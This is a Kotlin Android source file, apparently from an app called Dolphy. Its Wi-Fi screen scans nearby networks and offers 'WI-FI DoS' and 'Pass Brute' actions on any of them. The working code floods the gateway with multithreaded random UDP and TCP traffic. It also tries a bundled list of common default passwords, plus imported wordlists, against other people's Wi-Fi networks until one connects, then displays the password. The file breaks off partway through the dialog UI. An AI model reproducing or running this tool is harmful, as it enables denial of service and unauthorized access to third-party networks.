package com.droid.dolphy.network

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.SupplicantState
import android.net.wifi.WifiManager
import android.net.wifi.WifiNetworkSuggestion
import android.os.Build
import android.provider.Settings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.navigationBarsPadding
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.itemsIndexed
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.Add
import androidx.compose.material.icons.filled.Build
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.ChevronRight
import androidx.compose.material.icons.filled.Close
import androidx.compose.material.icons.filled.VpnKey
import androidx.compose.material.icons.filled.Delete
import androidx.compose.material.icons.filled.Wifi
import androidx.compose.material.icons.filled.FlashOn
import androidx.compose.material.icons.filled.SettingsEthernet
import androidx.compose.material.icons.filled.Shield
import androidx.compose.material.icons.filled.WifiOff
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.Checkbox
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.FilledTonalButton
import androidx.compose.material3.SwipeToDismissBox
import androidx.compose.material3.SwipeToDismissBoxValue
import androidx.compose.material3.rememberSwipeToDismissBoxState
import androidx.compose.ui.draw.clip
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalHapticFeedback
import androidx.compose.ui.viewinterop.AndroidView
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import androidx.navigation.NavController
import com.droid.dolphy.ExpressiveSegmentedCardList
import com.droid.dolphy.MaterialBackground
import com.droid.dolphy.MaterialCard
import com.droid.dolphy.MaterialDivider
import com.droid.dolphy.R
import com.droid.dolphy.SectionTopBar
import com.droid.dolphy.SignalRow
import com.droid.dolphy.TextGray
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.net.Socket
import java.net.InetSocketAddress
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

private data class HubWifiNetwork(
    val ssid: String,
    val bssid: String?,
    val level: Int,
    val frequencyMhz: Int,
    val capabilities: String?,
    val isActive: Boolean,
)

private enum class HubDialogStage {
    Menu,
    Countdown,
    WaitingConnection,
    Started,
    BruteForce,
    Error,
    AdminPanel,
}

private const val STOCK_GROUP_NAME = "Стоковые пароли"

@Serializable
private data class PasswordGroupDto(
    val name: String,
    val passwords: List<String>,
    val selected: Boolean
)

private class PasswordGroup(val name: String) {
    var selected by mutableStateOf(true)
    val passwords = mutableListOf<String>()
    val isImported: Boolean get() = name != STOCK_GROUP_NAME

    fun allPasswords(): List<String> = passwords.toList()
}

private fun getFileName(context: android.content.Context, uri: android.net.Uri): String {
    var name = "Imported"
    val cursor = context.contentResolver.query(uri, null, null, null, null)
    cursor?.use {
        if (it.moveToFirst()) {
            val idx = it.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME)
            if (idx >= 0) name = it.getString(idx) ?: "Imported"
        }
    }
    return name.substringBeforeLast(".").ifBlank { "Imported" }
}

@Composable
fun NetworkDiagnosticHubScreen(navController: NavController) {
    val context = LocalContext.current
    val haptics = LocalHapticFeedback.current
    val lifecycleOwner = LocalLifecycleOwner.current
    val wifiManager = remember {
        context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
    }
    val connectivityManager = remember {
        context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    }
    val scope = rememberCoroutineScope()

    fun requiredWifiPermissions(): Array<String> {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.NEARBY_WIFI_DEVICES,
                Manifest.permission.CHANGE_WIFI_STATE
            )
        } else {
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CHANGE_WIFI_STATE
            )
        }
    }

    fun hasWifiPermissions(): Boolean {
        return requiredWifiPermissions().all { permission ->
            ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    var wifiPermissionsGranted by remember { mutableStateOf(hasWifiPermissions()) }
    val locationManager = remember {
        context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
    }

    fun isLocationServicesEnabled(): Boolean {
        val lm = locationManager ?: return false
        return lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
            lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
    }

    var locationServicesEnabled by remember { mutableStateOf(isLocationServicesEnabled()) }
    var showLocationServicesDialog by remember { mutableStateOf(false) }
    val wifiPermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) {
        wifiPermissionsGranted = hasWifiPermissions()
        locationServicesEnabled = isLocationServicesEnabled()
    }


    LaunchedEffect(Unit) {
        if (!hasWifiPermissions()) {
            wifiPermissionLauncher.launch(requiredWifiPermissions())
        } else if (!locationServicesEnabled) {
            showLocationServicesDialog = true
        }
    }

    val networks = remember { mutableStateListOf<HubWifiNetwork>() }
    var dialogNetwork by remember { mutableStateOf<HubWifiNetwork?>(null) }
    var dialogStage by remember { mutableStateOf<HubDialogStage?>(null) }
    var countdown by remember { mutableIntStateOf(3) }
    var launchedWifiSettings by remember { mutableStateOf(false) }
    var udpSendJob by remember { mutableStateOf<kotlinx.coroutines.Job?>(null) }
    var bruteForceJob by remember { mutableStateOf<kotlinx.coroutines.Job?>(null) }
    val sendLogs = remember { mutableStateListOf<String>() }

    var bruteForceSuccess by remember { mutableStateOf(false) }
    var foundPassword by remember { mutableStateOf("") }

    var currentBrutePassword by remember { mutableStateOf("") }
    var showPasswordDialog by remember { mutableStateOf(false) }

    val prefs = remember { context.getSharedPreferences("wifi_passwords", Context.MODE_PRIVATE) }

    fun saveGroups(groups: List<PasswordGroup>) {
        val dtos = groups.map { PasswordGroupDto(it.name, it.passwords, it.selected) }
        try {
            val json = Json.encodeToString(dtos)
            prefs.edit().putString("groups", json).apply()
        } catch (e: Exception) {

        }
    }

    fun loadGroups(): List<PasswordGroup> {
        val json = prefs.getString("groups", null) ?: return emptyList()
        return try {
            val dtos = Json.decodeFromString<List<PasswordGroupDto>>(json)
            dtos.map { dto ->
                PasswordGroup(dto.name).apply {
                    passwords.addAll(dto.passwords)
                    selected = dto.selected
                }
            }
        } catch (e: Exception) {
            emptyList()
        }
    }

    val defaultPasswords = listOf(
        "12345678", "YJFJTGM2", "11111111", "00000000", "22222222", "33333333", "44444444", "55555555",
        "66666666", "77777777", "88888888", "99999999", "qwertyui", "qwertzui", "qwertyuiop", "asdfghjk",
        "password", "adminadmin", "87654321", "12344321", "00001111", "12312312", "11223344", "1234567890",
        "netgear1", "linksys1", "dlink123", "tplink123", "admin123", "rootroot", "guest123",
        "qwerty123", "12345qwerty", "admin", "root", "12345", "123456", "1234567",
        "freewifi", "free_wifi", "freewifi123", "internet", "guestwifi", "publicwifi", "welcome",
        "welcome123", "login123", "wifi1234", "accesspoint", "hotspot123", "openwifi", "starbucks",
        "mcdonalds", "public_wifi", "internet123", "home_wifi", "my_wifi", "secure_wifi", "w12345678i", "12346789"
    ).distinct()

    val passwordGroups = remember {
        val loaded = loadGroups()
        if (loaded.isNotEmpty()) {
            mutableStateListOf<PasswordGroup>().apply { addAll(loaded) }
        } else {
            mutableStateListOf<PasswordGroup>().apply {
                add(PasswordGroup(STOCK_GROUP_NAME).apply {
                    passwords.addAll(defaultPasswords)
                })
            }
        }
    }

    fun appendLog(message: String) {
        val stamp = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        sendLogs += "[$stamp] $message"
    }

    val fileImportLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.GetContent()
    ) { uri ->
        if (uri != null) {
            try {
                val groupName = getFileName(context, uri)
                val inputStream = context.contentResolver.openInputStream(uri)
                val text = inputStream?.bufferedReader()?.readText() ?: ""
                inputStream?.close()
                val imported = text.split("\\s+".toRegex())
                    .map { it.trim() }
                    .filter { it.isNotBlank() }
                    .distinct()
                if (imported.isNotEmpty()) {
                    val group = PasswordGroup(groupName)
                    group.passwords.addAll(imported)
                    passwordGroups.add(group)
                    saveGroups(passwordGroups)
                }
            } catch (e: Exception) {
                appendLog("Import error: ${e.message}")
            }
        }
    }

    fun getGatewayIpAddress(context: Context): String? {
        return try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val dhcpInfo = wifiManager.dhcpInfo
            val gatewayInt = dhcpInfo.gateway
            if (gatewayInt != 0) {
                val gatewayBytes = java.nio.ByteBuffer.allocate(4).order(java.nio.ByteOrder.LITTLE_ENDIAN).putInt(gatewayInt).array()
                java.net.InetAddress.getByAddress(gatewayBytes).hostAddress
            } else {
                null
            }
        } catch (e: Exception) {
            null
        }
    }

    fun currentSsid(): String? {
        val raw = runCatching { wifiManager.connectionInfo?.ssid }.getOrNull() ?: return null
        val normalized = raw.trim().trim('"')
        return normalized.takeIf { it.isNotBlank() && !it.equals("unknown ssid", ignoreCase = true) }
    }

    fun refreshNetworks() {
        if (!wifiPermissionsGranted || !locationServicesEnabled) {
            networks.clear()
            return
        }

        runCatching { wifiManager.startScan() }
        val activeSsid = currentSsid()
        val refreshed = runCatching { wifiManager.scanResults.orEmpty() }
            .getOrElse { emptyList() }
            .mapNotNull { scan ->
                val ssid = scan.SSID?.trim().orEmpty()
                if (ssid.isBlank()) null else HubWifiNetwork(
                    ssid = ssid,
                    bssid = scan.BSSID,
                    level = scan.level,
                    frequencyMhz = scan.frequency,
                    capabilities = scan.capabilities,
                    isActive = activeSsid == ssid,
                )
            }
            .distinctBy { it.ssid to it.bssid }
            .sortedWith(
                compareByDescending<HubWifiNetwork> { it.isActive }
                    .thenByDescending { it.level }
                    .thenBy { it.ssid.lowercase() }
            )

        networks.clear()
        networks.addAll(refreshed)
    }

    fun startContinuousUdpTest(targetSsid: String): kotlinx.coroutines.Job {
        appendLog(context.getString(R.string.network_hub_log_connected, targetSsid))
        appendLog(context.getString(R.string.network_hub_log_prepare))
        return scope.launch(Dispatchers.IO) {
            var packetCount = 0
            val gatewayIp = getGatewayIpAddress(context) ?: "255.255.255.255"
            appendLog(context.getString(R.string.network_hub_log_target, gatewayIp))


            val targetPorts = listOf(
                53, 80, 443, 8888, 5353, 1900,
                22, 23, 25, 110, 143, 389, 445, 3306, 3389, 5432, 6379, 9200, 27017, 50000
            )


            val jobs = (1..8).map { threadId ->
                launch {
                    val random = java.util.Random(threadId.toLong())
                    while (isActive) {
                        targetPorts.forEach { port ->
                            val payloadSize = random.nextInt(1400) + 64
                            val payload = ByteArray(payloadSize) { random.nextInt().toByte() }

                            val result = runCatching {
                                DatagramSocket().use { socket ->
                                    socket.broadcast = true
                                    socket.sendBufferSize = 65536
                                    socket.soTimeout = 50
                                    val address = InetAddress.getByName(gatewayIp)
                                    val packet = DatagramPacket(payload, payload.size, address, port)
                                    socket.send(packet)
                                }
                            }
                            packetCount++
                        }
                        delay(1)
                    }
                }
            }


            launch {
                val tcpPorts = listOf(80, 443, 8080, 3306, 5432)
                val random = java.util.Random()
                while (isActive) {
                    tcpPorts.forEach { port ->
                        runCatching {
                            Socket().use { socket ->
                                socket.soTimeout = 50
                                socket.connect(InetSocketAddress(gatewayIp, port), 100)
                                socket.getOutputStream().write(ByteArray(random.nextInt(512) + 64))
                            }
                        }
                        packetCount++
                    }
                    delay(2)
                }
            }


            launch {
                while (isActive) {
                    delay(500)
                    withContext(Dispatchers.Main) {
                        appendLog(context.getString(R.string.network_hub_log_flood, packetCount))
                    }
                }
            }


            jobs.forEach { it.join() }
        }
    }

    fun startWifiBruteForce(network: HubWifiNetwork) {
        bruteForceJob?.cancel()
        sendLogs.clear()
        dialogStage = HubDialogStage.BruteForce
        val selectedGroups = passwordGroups.filter { it.selected }
        val ordered = selectedGroups
            .flatMap { it.allPasswords() }
            .filter { it.length >= 8 }
            .distinct()
        val totalSelected = selectedGroups.sumOf { it.allPasswords().size }
        val targetSsid = network.ssid.trim('"')
        appendLog("Starting Brute Force: $targetSsid")
        appendLog("Groups: ${selectedGroups.joinToString { it.name }}")
        appendLog("Passwords to try: ${ordered.size} (${totalSelected - ordered.size} skipped, < 8 chars)")

        bruteForceJob = scope.launch(Dispatchers.IO) {

            withContext(Dispatchers.Main) {
                appendLog("Preparing radio (leave target / clear old suggestions)...")
            }
            prepareRadioForBrute(wifiManager, targetSsid)

            if (isFullyConnectedToSsid(wifiManager, targetSsid)) {
                withContext(Dispatchers.Main) {
                    appendLog("Still on $targetSsid. Disconnect from this network in system Wi-Fi and retry.")
                    appendLog("Scan finished.")
                }
                return@launch
            }

            for (index in ordered.indices) {
                if (!isActive) break
                val password = ordered[index]

                withContext(Dispatchers.Main) {
                    currentBrutePassword = password
                    appendLog("[${index + 1}/${ordered.size}] Testing: $password")
                }


                val result = testWifiPassword(context, wifiManager, targetSsid, password)

                if (!isActive) break

                if (result) {

                    val found = password
                    withContext(Dispatchers.Main) {
                        currentBrutePassword = found
                        appendLog("SUCCESS! Password found: $found")
                        foundPassword = found
                        bruteForceSuccess = true
                        com.droid.dolphy.trackWifiBruteSuccess(context)
                        haptics.performHapticFeedback(
                            androidx.compose.ui.hapticfeedback.HapticFeedbackType.LongPress,
                        )
                    }

                    break
                } else {
                    withContext(Dispatchers.Main) {
                        appendLog("Failed: $password")
                    }

                    settleAfterFailedAttempt(wifiManager, targetSsid)
                }
            }
            if (isActive) {
                withContext(Dispatchers.Main) {
                    appendLog("Scan finished.")
                }
            }
        }
    }

    fun closeDialog() {
        udpSendJob?.cancel()
        bruteForceJob?.cancel()
        udpSendJob = null
        bruteForceJob = null
        dialogStage = null
        dialogNetwork = null
        countdown = 3
        launchedWifiSettings = false
        sendLogs.clear()
        bruteForceSuccess = false
        foundPassword = ""
    }

    fun startActiveNetworkTest(network: HubWifiNetwork) {
        udpSendJob?.cancel()
        udpSendJob = null
        dialogNetwork = network
        dialogStage = HubDialogStage.Started
        launchedWifiSettings = false
        sendLogs.clear()
        udpSendJob = startContinuousUdpTest(network.ssid)
    }

    LaunchedEffect(wifiPermissionsGranted, locationServicesEnabled) {
        if (wifiPermissionsGranted && !locationServicesEnabled) {
            showLocationServicesDialog = true
        }
    }

    DisposableEffect(lifecycleOwner, wifiPermissionsGranted) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                wifiPermissionsGranted = hasWifiPermissions()
                locationServicesEnabled = isLocationServicesEnabled()
                showLocationServicesDialog = wifiPermissionsGranted && !locationServicesEnabled
                refreshNetworks()

                val target = dialogNetwork
                if (launchedWifiSettings && dialogStage == HubDialogStage.WaitingConnection && target != null) {
                    val connected = currentSsid() == target.ssid
                    launchedWifiSettings = false
                    if (connected) {
                        dialogStage = HubDialogStage.Started
                        sendLogs.clear()
                        udpSendJob?.cancel()
                        udpSendJob = null
                        udpSendJob = startContinuousUdpTest(target.ssid)
                    } else {
                        dialogStage = HubDialogStage.Error
                    }
                }
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    DisposableEffect(wifiPermissionsGranted, locationServicesEnabled, wifiManager) {
        refreshNetworks()
        val job = scope.launch {
            while (isActive) {
                if (wifiPermissionsGranted && locationServicesEnabled) refreshNetworks()
                delay(2500)
            }
        }
        onDispose { job.cancel() }
    }

    LaunchedEffect(dialogStage, countdown, dialogNetwork?.ssid) {
        if (dialogStage == HubDialogStage.Countdown && dialogNetwork != null) {
            if (countdown > 1) {
                delay(1000)
                countdown -= 1
            } else {
                delay(1000)
                dialogStage = HubDialogStage.WaitingConnection
                launchedWifiSettings = true
                context.startActivity(Intent(Settings.ACTION_WIFI_SETTINGS))
            }
        }
    }

    Box(modifier = Modifier.fillMaxSize()) {
        MaterialBackground(accentColor = MaterialTheme.colorScheme.primary) {
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .statusBarsPadding()
                    .navigationBarsPadding()
                    .padding(horizontal = 16.dp, vertical = 12.dp),
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                SectionTopBar(
                    title = stringResource(R.string.network_hub_title),
                    onBack = { navController.popBackStack() },
                    actions = {
                        IconButton(onClick = { showPasswordDialog = true }) {
                            Icon(Icons.Filled.VpnKey, contentDescription = stringResource(R.string.wifi_brute_force_passwords), tint = MaterialTheme.colorScheme.primary)
                        }
                    }
                )

                if (!wifiPermissionsGranted) {
                    Surface(
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(24.dp),
                        color = MaterialTheme.colorScheme.errorContainer
                    ) {
                        Column(
                            modifier = Modifier.padding(18.dp),
                            verticalArrangement = Arrangement.spacedBy(10.dp)
                        ) {
                            Text(
                                text = stringResource(R.string.network_hub_need_location),
                                style = MaterialTheme.typography.bodyLarge,
                                color = MaterialTheme.colorScheme.onErrorContainer
                            )
                            FilledTonalButton(onClick = {
                                wifiPermissionLauncher.launch(requiredWifiPermissions())
                            }) {
                                Text(stringResource(R.string.us_wifi_grant_location))
                            }
                        }
                    }
                } else if (!locationServicesEnabled) {
                    Surface(
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(24.dp),
                        color = MaterialTheme.colorScheme.errorContainer
                    ) {
                        Column(
                            modifier = Modifier.padding(18.dp),
                            verticalArrangement = Arrangement.spacedBy(10.dp)
                        ) {
                            Text(
                                text = stringResource(R.string.us_wifi_need_location_services),
                                style = MaterialTheme.typography.bodyLarge,
                                color = MaterialTheme.colorScheme.onErrorContainer
                            )
                            FilledTonalButton(onClick = {
                                showLocationServicesDialog = false
                                context.startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                            }) {
                                Text(stringResource(R.string.us_wifi_enable_location_services))
                            }
                        }
                    }
                }

                LazyColumn(
                    modifier = Modifier.fillMaxSize(),
                    verticalArrangement = Arrangement.spacedBy(12.dp),
                    contentPadding = PaddingValues(bottom = 20.dp)
                ) {
                    items(networks) { network ->
                        MaterialCard(
                            modifier = Modifier.fillMaxWidth(),
                            accentColor = if (network.isActive) MaterialTheme.colorScheme.primary else Color(0xFFD32F2F),
                            cornerRadius = 16.dp,
                            contentPadding = 0.dp
                        ) {
                            SignalRow(
                                title = network.ssid,
                                description = if (network.isActive) stringResource(R.string.network_hub_active_pinned)
                                else "${network.frequencyMhz} MHz • ${network.level} dBm",
                                icon = Icons.Default.Wifi,
                                accentColor = if (network.isActive) MaterialTheme.colorScheme.primary else Color(0xFFD32F2F),
                                onClick = {
                                    haptics.performHapticFeedback(androidx.compose.ui.hapticfeedback.HapticFeedbackType.LongPress)
                                    if (!wifiPermissionsGranted) {
                                        wifiPermissionLauncher.launch(requiredWifiPermissions())
                                    } else if (!locationServicesEnabled) {
                                        showLocationServicesDialog = true
                                    } else {

                                        dialogNetwork = network
                                        dialogStage = HubDialogStage.Menu
                                    }
                                },
                                trailingContent = {
                                    if (network.isActive) {
                                        Icon(
                                            Icons.Filled.CheckCircle,
                                            null,
                                            tint = MaterialTheme.colorScheme.primary,
                                            modifier = Modifier.size(20.dp)
                                        )
                                    } else {
                                        Icon(
                                            Icons.Default.ChevronRight,
                                            null,
                                            tint = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.4f),
                                            modifier = Modifier.size(20.dp)
                                        )
                                    }
                                }
                            )
                        }
                    }

                    item {
                        Spacer(modifier = Modifier.height(180.dp))
                    }
                }
            }
        }
    }

    if (showLocationServicesDialog) {
        com.droid.dolphy.ExpressiveDialog(
            onDismissRequest = { showLocationServicesDialog = false },
            title = { Text(stringResource(R.string.us_wifi_location_services_disabled_title)) },
            text = { Text(stringResource(R.string.us_wifi_location_services_disabled_message)) },
            confirmButton = {
                Button(onClick = {
                    showLocationServicesDialog = false
                    context.startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                }) {
                    Text(stringResource(R.string.us_wifi_enable_location_services))
                }
            },
            dismissButton = {
                TextButton(onClick = { showLocationServicesDialog = false }) {
                    Text(stringResource(R.string.cancel))
                }
            }
        )
    }

    val currentDialogNetwork = dialogNetwork
    val currentDialogStage = dialogStage
    if (currentDialogNetwork != null && currentDialogStage != null) {
        Dialog(
            onDismissRequest = { closeDialog() },
            properties = DialogProperties(dismissOnClickOutside = false)
        ) {
            Surface(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(28.dp),
                color = MaterialTheme.colorScheme.surfaceContainerHighest,
                tonalElevation = 8.dp
            ) {
                when (currentDialogStage) {
                    HubDialogStage.Menu -> {
                        Column(
                            modifier = Modifier.padding(24.dp),
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            Text(
                                text = currentDialogNetwork.ssid,
                                style = MaterialTheme.typography.headlineSmall,
                                fontWeight = FontWeight.Bold,
                                color = MaterialTheme.colorScheme.onSurface
                            )

                            MaterialCard(
                                modifier = Modifier.fillMaxWidth(),
                                accentColor = MaterialTheme.colorScheme.primary,
                                cornerRadius = 12.dp,
                                contentPadding = 0.dp
                            ) {
                                SignalRow(
                                    title = "WI-FI DoS",
                                    description = stringResource(R.string.wifi_stress_test),
                                    icon = Icons.Default.FlashOn,
                                    accentColor = MaterialTheme.colorScheme.primary,
                                    onClick = {
                                        if (currentDialogNetwork.isActive) {
                                            startActiveNetworkTest(currentDialogNetwork)
                                        } else {
                                            dialogStage = HubDialogStage.Countdown
                                            countdown = 3
                                            launchedWifiSettings = false
                                            sendLogs.clear()
                                        }
                                    }
                                )
                            }

                            MaterialCard(
                                modifier = Modifier.fillMaxWidth(),
                                accentColor = Color(0xFFF44336),
                                cornerRadius = 12.dp,
                                contentPadding = 0.dp
                            ) {
                                SignalRow(
                                    title = "Pass Brute",
                                    description = stringResource(R.string.wifi_password_brute),
                                    icon = Icons.Default.SettingsEthernet,
                                    accentColor = Color(0xFFF44336),
                                    onClick = {
                                        startWifiBruteForce(currentDialogNetwork)
                                    }
                                )
                            }

                            MaterialCard(
                                modifier = Modifier.fillMaxWidth(),
                                accentColor = Color(0xFF4CAF50),
                                cornerRadius = 12.dp,
                                contentPadding = 0.dp
                            ) {
                                SignalRow(
                                    title = stringResource(R.string.network_hub_admin_panel),
                                    description = stringResource(R.string.network_hub_admin_panel_desc),
                                    icon = Icons.Default.Shield,
                                    accentColor = Color(0xFF4CAF50),
                                    onClick = {
                                        dialogStage = HubDialogStage.AdminPanel
                                    }
                                )
                            }

                            TextButton(onClick = { closeDialog() }, modifier = Modifier.fillMaxWidth()) {
                                Text(stringResource(R.string.cancel))
                            }
                        }
                    }

                    HubDialogStage.Countdown -> {
                        Column(
                            modifier = Modifier.padding(24.dp),
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            Text(
                                text = stringResource(R.string.network_hub_select_network, currentDialogNetwork.ssid),
                                style = MaterialTheme.typography.titleLarge,
                                fontWeight = FontWeight.Bold,
                            )
                            Text(
                                text = countdown.toString(),
                                style = MaterialTheme.typography.displayLarge,
                                color = MaterialTheme.colorScheme.primary,
                                fontWeight = FontWeight.ExtraBold,
                            )
                            FilledTonalButton(
                                onClick = { closeDialog() },
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Text(stringResource(R.string.cancel))
                            }
                        }
                    }

                    HubDialogStage.WaitingConnection -> {
                        Column(
                            modifier = Modifier.padding(24.dp),
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            CircularProgressIndicator()
                            Text(
                                text = stringResource(R.string.network_hub_waiting_title),
                                style = MaterialTheme.typography.headlineSmall,
                                fontWeight = FontWeight.Bold,
                            )
                            Text(
                                text = stringResource(R.string.network_hub_waiting_message, currentDialogNetwork.ssid),
                                style = MaterialTheme.typography.bodyLarge,
                                color = MaterialTheme.colorScheme.onSurfaceVariant,
                            )
                            FilledTonalButton(
                                onClick = { closeDialog() },
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Text(stringResource(R.string.cancel))
                            }
                        }
                    }

                    HubDialogStage.Started, HubDialogStage.BruteForce -> {
                        Column(
                            modifier = Modifier.padding(24.dp),
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            Text(
                                text = if (currentDialogStage == HubDialogStage.Started)
                                    stringResource(R.string.network_hub_started_title)
                                    else stringResource(R.string.wifi_brute_force_active),
                                style = MaterialTheme.typography.headlineSmall,
                                fontWeight = FontWeight.Bold,
                            )

                            if (currentDialogStage == HubDialogStage.BruteForce) {
                                Text(
                                    text = stringResource(R.string.wifi_testing, currentBrutePassword),
                                    style = MaterialTheme.typography.titleMedium,
                                    color = MaterialTheme.colorScheme.primary,
                                    fontWeight = FontWeight.Bold
                                )
                                LinearProgressIndicator(
                                    modifier = Modifier.fillMaxWidth().height(4.dp).clip(RoundedCornerShape(2.dp)),
                                    color = MaterialTheme.colorScheme.primary
                                )
                            }

                            if (currentDialogStage == HubDialogStage.BruteForce && bruteForceSuccess) {
                                Column(
                                    modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp),
                                    horizontalAlignment = Alignment.CenterHorizontally,
                                    verticalArrangement = Arrangement.spacedBy(16.dp)
                                ) {
                                    Icon(
                                        Icons.Filled.CheckCircle,
                                        null,
                                        tint = Color.Green,
                                        modifier = Modifier.size(64.dp)
                                    )
                                    Text(
                                        text = stringResource(R.string.wifi_bruteforce_successful),
                                        style = MaterialTheme.typography.headlineSmall,
                                        color = Color.Green,
                                        fontWeight = FontWeight.Bold
                                    )
                                    Surface(
                                        color = Color.Black.copy(alpha = 0.8f),
                                        shape = RoundedCornerShape(12.dp),
                                        modifier = Modifier.fillMaxWidth()
                                    ) {
                                        Column(
                                            modifier = Modifier.padding(16.dp),
                                            horizontalAlignment = Alignment.CenterHorizontally
                                        ) {
                                        Text(
                                            text = stringResource(R.string.wifi_password_label),
                                                style = MaterialTheme.typography.labelMedium,
                                                color = Color.White.copy(alpha = 0.6f)
                                            )
                                            Text(
                                                text = foundPassword,
                                                style = MaterialTheme.typography.headlineMedium,
                                                fontWeight = FontWeight.ExtraBold,
                                                color = Color.Green,
                                                textAlign = TextAlign.Center
                                            )
                                        }
                                    }
                                }
                            } else {
                                Text(
                                    text = stringResource(R.string.network_hub_logs_title),
                                    style = MaterialTheme.typography.titleMedium,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                                )
                                if (sendLogs.isEmpty()) {
                                    Text(
                                        text = stringResource(R.string.network_hub_log_prepare),
                                        style = MaterialTheme.typography.bodyMedium,
                                        color = MaterialTheme.colorScheme.onSurfaceVariant,
                                    )
                                } else {
                                    Surface(
                                        modifier = Modifier
                                            .fillMaxWidth()
                                            .height(200.dp),
                                        shape = RoundedCornerShape(12.dp),
                                        color = Color.Black.copy(alpha = 0.8f)
                                    ) {
                                        LazyColumn(
                                            modifier = Modifier
                                                .fillMaxSize()
                                                .padding(12.dp),
                                            contentPadding = PaddingValues(4.dp),
                                            reverseLayout = true
                                        ) {
                                            items(sendLogs.size) { index ->
                                                Text(
                                                    text = sendLogs[sendLogs.size - 1 - index],
                                                    style = MaterialTheme.typography.bodyMedium,
                                                    color = if (currentDialogStage == HubDialogStage.BruteForce) Color.Green else Color(0xFFFF1744),
                                                    modifier = Modifier.padding(vertical = 2.dp)
                                                )
                                            }
                                        }
